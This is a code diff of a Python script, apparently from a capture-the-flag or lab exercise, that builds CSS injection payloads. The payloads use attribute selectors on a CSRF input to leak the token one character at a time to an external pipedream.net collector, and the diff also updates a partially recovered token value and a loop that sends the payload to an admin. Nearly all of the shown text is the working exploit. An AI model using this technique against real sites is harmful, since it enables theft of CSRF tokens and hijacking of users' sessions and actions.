@@ -77,7 +77,7 @@ def build_css(chars):
         input[name="csrf"][value^="'''+chars+''''''+bytearray.fromhex("5C").decode()+bytearray.fromhex("5C").decode()+'''"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%28);}
         input[name="csrf"][value^="'''+chars+''']"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''%29);}
         input[name="csrf"][value^="'''+chars+'''^"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''^);}
-        input[name="csrf"][value^="ruW-tjL1BWCdhbiOSC_"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/ruW-tjL1BWCdhbiOSC_);}
+        input[name="csrf"][value^="'''+chars+'''_"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''_);}
         input[name="csrf"][value^="'''+chars+'''`"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''`);}
         input[name="csrf"][value^="'''+chars+'''a"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''a);}
         input[name="csrf"][value^="'''+chars+'''b"]{background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/'''+chars+'''b);}
@@ -116,7 +116,7 @@ def build_css(chars):
 
 # ----
 chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
-know  = "ruW-tjL1BWCdhbiOSCA" 
+know  = "ruW-tjL1BWCdhbiOSCA7" 
 
 # envoie à admin 
 while 1:
